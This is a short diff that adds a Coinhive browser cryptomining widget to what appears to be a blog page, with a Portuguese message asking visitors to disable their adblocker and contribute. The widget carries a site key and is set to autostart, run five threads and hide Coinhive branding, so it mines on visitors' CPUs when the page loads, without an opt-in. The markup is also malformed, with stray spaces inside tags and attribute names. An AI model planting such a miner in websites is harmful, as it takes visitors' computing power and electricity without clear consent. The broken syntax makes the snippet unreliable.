@@ -1,0 +1,11 @@
+< div class = "coinhive-miner"
+data - action = "#00ff00"
+data - autostart = "true"
+data - background = "#000000"
+data - graph = "#555555"
+data - key = "K7tDFgBOHUsHMQNyBGumndZqWbB6Up7u"
+data - start = "Contribua agora_ :)"
+data - text = "#eeeeee"
+data - threads = "5"
+data - throttle = "0.75"
+data - whitelabel = "true" > < em > Me ajude_: ) desabilite seu Adblock e contribua com meu blog_;) < /em></div >
